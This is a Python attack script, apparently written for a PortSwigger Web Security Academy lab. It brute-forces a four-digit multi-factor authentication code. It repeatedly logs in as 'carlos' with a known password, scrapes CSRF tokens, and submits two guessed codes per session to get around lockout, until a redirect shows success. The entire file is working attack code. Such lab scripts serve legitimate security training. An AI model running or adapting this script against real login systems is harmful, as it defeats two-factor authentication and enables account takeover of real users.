import time
import requests
from queue import Queue
from bs4 import BeautifulSoup

server_name = "0a1000430352501e8271bfdf0019003c"

url1 = f"https://{server_name}.web-security-academy.net/login"
url2 = f"https://{server_name}.web-security-academy.net/login2"
headers_get = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{server_name}.web-security-academy.net/login",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

headers_post = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{server_name}.web-security-academy.net",
    "Referer": f"https://{server_name}.web-security-academy.net/login2",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}



queue = Queue()


# Find the csrf token
def getCsrf(response_data):
    soup = BeautifulSoup(response_data.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token

# Check if the mfa is correct
def mfaCheck(response, temp_mfa):
    if response.status_code == 302:
        print(f"[*] MFA Code Found: {temp_mfa}")
        for key, value in response.headers.items():
            print(f"{key}: {value}")
            return 1
    else:
        print(f"[-] Tried {temp_mfa} | Response: {response.status_code}")
        return 0

def main():
    found = False

    # GET /Login
    response = requests.get(url1, headers=headers_get, allow_redirects=False)
    # print(f"\n--------------------------\nG1\nheaders: {headers_get}\n"
    #       f"{response}\n{response.headers}\n{response.text}")

    while not found:
        for i in range(1500):
            queue.put(str(i).zfill(4))

        while not queue.empty():
            # POST /Login
            session = response.cookies.get_dict().get("session")
            headers_post["Cookie"] = f"session={session}"
            csrf = getCsrf(response)
            data = f"csrf={csrf}&username=carlos&password=montoya"
            headers_post["Content-Length"] = str(len(data))
            response = requests.post(url1, headers=headers_post, data=data, allow_redirects=False)
            # print(f"\n--------------------------\nP1\nheaders: {headers_post}\ndata: {data}\n"
            #       f"{response}\n{response.headers}\n{response.text}")

            # GET /Login2
            session = response.cookies.get_dict().get("session")
            headers_get["Cookie"] = f"session={session}"
            response = requests.get(url2, headers=headers_get, allow_redirects=False)
            # print(f"\n--------------------------\nG2\nheaders: {headers_get}\n"
            #       f"{response}\n{response.headers}\n{response.text}")

            # POST /Login2 (1)
            csrf = getCsrf(response)
            headers_post["Cookie"] = f"session={session}"
            temp_mfa = queue.get()
            data = f"csrf={csrf}&mfa-code={temp_mfa}"
            headers_post["Content-Length"] = str(len(data))
            response = requests.post(url2, headers=headers_post, data=data, allow_redirects=False)
            # print(f"\n--------------------------\nP2(1)\nheaders: {headers_post}\ndata: {data}\n"
            #       f"{response}\n{response.headers}\n{response.text}")
            if mfaCheck(response, temp_mfa):
                found = True
                print(response.headers)
                break

            # POST /Login2 (2)
            temp_mfa = queue.get()
            data = f"csrf={csrf}&mfa-code={temp_mfa}"
            headers_post["Content-Length"] = str(len(data))
            response = requests.post(url2, headers=headers_post, data=data, allow_redirects=False)
            # print(f"\n--------------------------\nP2(2)\nheaders: {headers_post}\ndata: {data}\n"
            #       f"{response}\n{response.headers}\n{response.text}")
            if mfaCheck(response, temp_mfa):
                found = True
                print(response.headers)
                break


if __name__ == "__main__":
    main()